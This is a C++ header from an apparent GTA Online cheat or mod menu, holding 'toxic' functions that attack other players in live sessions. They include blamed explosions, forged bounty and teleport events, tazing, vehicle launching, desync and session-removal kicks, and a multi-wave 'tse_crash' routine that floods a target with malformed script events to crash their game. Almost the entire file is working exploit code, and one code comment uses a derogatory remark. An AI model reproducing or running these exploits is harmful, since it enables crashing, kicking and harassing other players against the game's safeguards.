#pragma once
#include "gta/enums.hpp"
#include "natives.hpp"
#include "script_global.hpp"
#include "system.hpp"
#include "entity.hpp"
#include "gta_util.hpp"
#include "services/players/player.hpp"

namespace big::toxic
{
	inline void blame_explode_coord(Player to_blame, Vector3 pos, eExplosionType explosion_type, float damage, bool is_audible, bool is_invisible, float camera_shake)
	{
		system::patch_blame(true);
		FIRE::ADD_OWNED_EXPLOSION(
			PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(to_blame),
			pos.x, pos.y, pos.z,
			explosion_type,
			damage,
			is_audible,
			is_invisible,
			camera_shake
		);
		system::patch_blame(false);
	}

	inline void blame_explode_player(Player to_blame, Player target, eExplosionType explosion_type, float damage, bool is_audible, bool is_invisible, float camera_shake)
	{
		Vector3 coords = ENTITY::GET_ENTITY_COORDS(PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(target), true);
		blame_explode_coord(to_blame, coords, explosion_type, damage, is_audible, is_invisible, camera_shake);
	}

	inline void bounty_player(Player target, int amount)
	{
		const size_t arg_count = 22;
		int64_t args[arg_count] = {
			static_cast<int64_t>(eRemoteEvent::Bounty),
			self::id,
			target,
			0, // set by player or NPC?
			amount,
			0, 1, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0,
			*script_global(1921039).at(9).as<int*>(),
			*script_global(1921039).at(10).as<int*>()
		};

		g_pointers->m_trigger_script_event(1, args, arg_count, -1);
	}

	inline void desync_kick(CNetGamePlayer *player)
	{
		gta_util::get_network_player_mgr()->RemovePlayer(player);
	}

	inline void taze_player(const Player player)
	{
		const Ped target = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(player);

		constexpr auto max_attempts = 20;
		for (size_t attempts = 0; attempts < max_attempts && !ENTITY::IS_ENTITY_DEAD(target, false); attempts++)
		{
			const Vector3 destination = PED::GET_PED_BONE_COORDS(target, (int)PedBones::SKEL_ROOT, 0.0f, 0.0f, 0.0f);
			const Vector3 origin = PED::GET_PED_BONE_COORDS(target, (int)PedBones::SKEL_R_Hand, 0.0f, 0.0f, 0.2f);

			MISC::SHOOT_SINGLE_BULLET_BETWEEN_COORDS(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, 0, RAGE_JOAAT("WEAPON_STUNGUN"), self::ped, false, true, 1);
		}
	}

	inline void kick_from_vehicle(const Player player)
	{
		const Ped target = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(player);

		TASK::CLEAR_PED_TASKS_IMMEDIATELY(target);
	}

	inline void flying_vehicle(const Player player)
	{
		Entity ent = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(player);

		if (!PED::IS_PED_IN_ANY_VEHICLE(ent, true))
			g_notification_service->push_warning("Toxic", "Target player is not in a vehicle.");
		else {
			ent = PED::GET_VEHICLE_PED_IS_IN(ent, false);

			if (entity::take_control_of(ent))
				ENTITY::APPLY_FORCE_TO_ENTITY(ent, 1, 0.f, 0.f, 50000.f, 0.f, 0.f, 0.f, 0, 0, 1, 1, 0, 1);
			else
				g_notification_service->push_warning("Toxic", "Failed to take control of player vehicle.");
		}
	}

	//
	// SechsMenu Code START
	//

	inline void send_to_cayo_perico(const Player target)
	{
		constexpr size_t arg_count = 3;
		int64_t args[arg_count] = {
			static_cast<int64_t>(eRemoteEvent::SendToCayoPerico),//SendToLocation
			self::id,
			target
		};

		g_pointers->m_trigger_script_event(1, args, arg_count, 1 << target);
	}

	inline static std::vector<int64_t> crash_hashes =
	{
		1480548969, 931221602, 668886109, -51486976, 1992522613, -1338917610, 1115266513, -1529596656, -2093023277, -1539131577, 495813132, -2085190907, 1488038476, 1674887089, 1007883955, 597430116,
		893081016, 886128956, 526822748, -637352381, -1991423686, -1013989798, -803535423, 1037001637, -397256754, 1111927333, -1388926377, -1908874529, -283041276, -768108950, -547323955
	};

	inline void tse_crash(int target) //thanks to cl1xa
	{
		//Wave I
		int64_t args1[] = { 526822748, -1, 500000, 849451549, -1, -1 };
		g_pointers->m_trigger_script_event(1, args1, sizeof(args1) / sizeof(args1[0]), 1 << target);

		int64_t args2[] = { -555356783, -1, 500000, 849451549, -1, -1 };
		g_pointers->m_trigger_script_event(1, args2, sizeof(args2) / sizeof(args2[0]), 1 << target);

		int64_t args3[] = { -637352381, -1, 500000, 849451549, -1, -1 };
		g_pointers->m_trigger_script_event(1, args3, sizeof(args3) / sizeof(args3[0]), 1 << target);

		int64_t args4[] = { -51486976, -1, 500000, 849451549, -1, -1 };
		g_pointers->m_trigger_script_event(1, args4, sizeof(args4) / sizeof(args4[0]), 1 << target);

		int64_t args5[] = { -1386010354, -1, 500000, 849451549, -1, -1 };
		g_pointers->m_trigger_script_event(1, args5, sizeof(args5) / sizeof(args5[0]), 1 << target);

		script::get_current()->yield();

		//Wave II
		int64_t args6[] = { 526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423 };
		g_pointers->m_trigger_script_event(1, args6, sizeof(args6) / sizeof(args6[0]), 1 << target);

		int64_t args7[] = { -555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423 };
		g_pointers->m_trigger_script_event(1, args7, sizeof(args7) / sizeof(args7[0]), 1 << target);

		int64_t args8[] = { -637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423 };
		g_pointers->m_trigger_script_event(1, args8, sizeof(args8) / sizeof(args8[0]), 1 << target);

		int64_t args9[] = { -51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423 };
		g_pointers->m_trigger_script_event(1, args9, sizeof(args9) / sizeof(args9[0]), 1 << target);

		int64_t args10[] = { -1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423 };
		g_pointers->m_trigger_script_event(1, args10, sizeof(args10) / sizeof(args10[0]), 1 << target);

		script::get_current()->yield();

		//Wave III
		int64_t args11[] = { 526822748, target, 0, 30583, 0, 0, 0, -328966, 1132039228, 0 };
		g_pointers->m_trigger_script_event(1, args11, sizeof(args11) / sizeof(args11[0]), 1 << target);

		int64_t args12[] = { -555356783, target, 0, 30583, 0, 0, 0, -328966, 1132039228, 0 };
		g_pointers->m_trigger_script_event(1, args12, sizeof(args12) / sizeof(args12[0]), 1 << target);

		int64_t args13[] = { -637352381, target, 0, 30583, 0, 0, 0, -328966, 1132039228, 0 };
		g_pointers->m_trigger_script_event(1, args13, sizeof(args13) / sizeof(args13[0]), 1 << target);

		int64_t args14[] = { -51486976, target, 0, 30583, 0, 0, 0, -328966, 1132039228, 0 };
		g_pointers->m_trigger_script_event(1, args14, sizeof(args14) / sizeof(args14[0]), 1 << target);

		int64_t args15[] = { -1386010354, target, 0, 30583, 0, 0, 0, -328966, 1132039228, 0 };
		g_pointers->m_trigger_script_event(1, args15, sizeof(args15) / sizeof(args15[0]), 1 << target);

		script::get_current()->yield();

		//Elona Gay
		const int plyr = target;

		for (size_t i = 0; i < crash_hashes.size(); i++)
		{
			int64_t args1[] = { crash_hashes[i], -1, 500000, 849451549, -1, -1 };
			g_pointers->m_trigger_script_event(1, args1, sizeof(args1) / sizeof(args1[0]), 1 << plyr);

			script::get_current()->yield();

			int64_t args2[] = { crash_hashes[i], rand() % INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, INT64_MAX, rand() % INT64_MAX, rand() % INT64_MAX, };
			g_pointers->m_trigger_script_event(1, args2, sizeof(args2) / sizeof(args2[0]), 1 << plyr);

			script::get_current()->yield();
		}

		script::get_current()->yield();
	}

	//
	// SechsMenu Code END
	//


	inline void breakup_kick(Player target) // From maybegreat48
	{
		rage::snMsgRemoveGamersFromSessionCmd cmd{};
		Network* network = gta_util::get_network();
		//LOG(G3LOG_DEBUG) << "Network Ptr: " << system::get_network();
		//LOG(G3LOG_DEBUG) << "Network Ptr2: " << network;
		//LOG(G3LOG_DEBUG) << "Game Session Ptr: " << network->m_game_session_ptr;
		//LOG(G3LOG_DEBUG) << "Players: " << network->m_game_session_ptr->m_players;
		//LOG(G3LOG_DEBUG) << "Session id: " << network->m_game_session_ptr->m_rline_session.m_session_id;
		cmd.m_session_id = network->m_game_session_ptr->m_rline_session.m_session_id;
		cmd.m_num_peers = 1;
		cmd.m_peer_ids[0] = g_player_service->get_by_id(target)->get_session_peer()->m_peer_data.m_peer_id;

		g_pointers->m_handle_remove_gamer_cmd(network->m_game_session_ptr, g_player_service->get_by_id(target)->get_session_player(), &cmd);
		for (auto& [name, plyr] : g_player_service->players())
		{
			if (plyr->id() != target)
				g_pointers->m_send_remove_gamer_cmd(network->m_game_session_ptr->m_net_connection_mgr,
					g_pointers->m_get_connection_peer(network->m_game_session_ptr->m_net_connection_mgr, plyr->get_session_player()->m_player_data.m_peer_id),
					network->m_game_session_ptr->m_connection_identifier, &cmd, 0x1000000);
		}
	}
}
